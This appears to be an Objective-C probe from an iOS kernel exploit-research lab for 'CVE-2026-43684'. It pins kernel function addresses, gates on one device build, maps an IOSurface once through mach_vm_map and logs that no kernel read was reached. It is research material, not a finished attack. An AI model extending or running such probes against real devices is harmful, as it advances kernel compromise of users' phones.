//
//  P069DmaCommandMap.m
//  CVE-2026-43684 IOMD dmaCommandOperation MAP. One IOSurface → mach_vm_map.
//  Pin: cve43684_IOMD_dmaCommandOperation @ 0xfffffff00a507dbc
//       IOMemoryDescriptor_makeMapping @ 0xfffffff00a512314
//  No unbounded _dmaReferences +0x34 increment.
//

#import "P069DmaCommandMap.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <CoreFoundation/CoreFoundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <string.h>
#import <unistd.h>

#define P069_BUILD @"p069-dma-command-map-v1"

typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*IOSurfaceCreate_t)(CFDictionaryRef);
typedef mach_port_t (*IOSurfaceCreateMachPort_t)(IOSurfaceRef);
kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address,
                          mach_vm_size_t size, mach_vm_offset_t mask, int flags,
                          mem_entry_name_port_t object, memory_object_offset_t offset,
                          boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection,
                          vm_inherit_t inheritance);
kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);

@implementation P069DmaCommandMap

+ (NSString *)tap {
    NSMutableString *log = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    int fd = open([[docs stringByAppendingPathComponent:@"p069_dma_command_log.txt"] UTF8String],
                  O_CREAT | O_WRONLY | O_TRUNC, 0644);
    void (^L)(NSString *) = ^(NSString *s) {
        NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
        [log appendString:out];
        if (fd >= 0) { const char *p = out.UTF8String; if (p) write(fd, p, strlen(p)); }
    };
    L([NSString stringWithFormat:@"=== p069 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P069_BUILD]);
    L(@"CVE-2026-43684 UAF class. dmaCommandOperation 0xfffffff00a507dbc makeMapping 0xfffffff00a512314");
    L(@"upl_validation ABSENT. One map, no +0x34 unbounded increment.");
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p069"];
    if (stop) {
        L(stop);
        if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
        return log;
    }

    void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    IOSurfaceCreate_t create = h ? (IOSurfaceCreate_t)dlsym(h, "IOSurfaceCreate") : NULL;
    IOSurfaceCreateMachPort_t mkport = h ? (IOSurfaceCreateMachPort_t)dlsym(h, "IOSurfaceCreateMachPort") : NULL;
    L([NSString stringWithFormat:@"IOSurfaceCreate=%p CreateMachPort=%p", create, mkport]);
    if (!create) {
        L(@"[-] IOSurfaceCreate missing");
        if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
        return log;
    }

    NSDictionary *props = @{
        @"IOSurfaceWidth": @64,
        @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4,
        @"IOSurfaceBytesPerRow": @(64 * 4),
        @"IOSurfaceAllocSize": @(64 * 64 * 4),
    };
    IOSurfaceRef surf = create((__bridge CFDictionaryRef)props);
    L([NSString stringWithFormat:@"IOSurfaceCreate %p", surf]);
    if (!surf) {
        if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
        return log;
    }

    mach_port_t port = mkport ? mkport(surf) : MACH_PORT_NULL;
    L([NSString stringWithFormat:@"mach port=0x%x", (unsigned)port]);
    if (port) {
        mach_vm_address_t addr = 0;
        kern_return_t kr = mach_vm_map(mach_task_self(), &addr, 64 * 64 * 4, 0, 1,
                                       port, 0, 0, VM_PROT_READ | VM_PROT_WRITE,
                                       VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
        L([NSString stringWithFormat:@"mach_vm_map kr=0x%x addr=0x%llx (makeMapping consumer)",
           (unsigned)kr, (unsigned long long)addr]);
        if (kr == 0 && addr) mach_vm_deallocate(mach_task_self(), addr, 64 * 64 * 4);
        mach_port_deallocate(mach_task_self(), port);
    }
    CFRelease(surf);
    L(@"=== VERDICT === mapping path exercised once. Increment is IOMD+0x68 (not +0x34). hasKread=NO.");
    if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
    return log;
}

@end
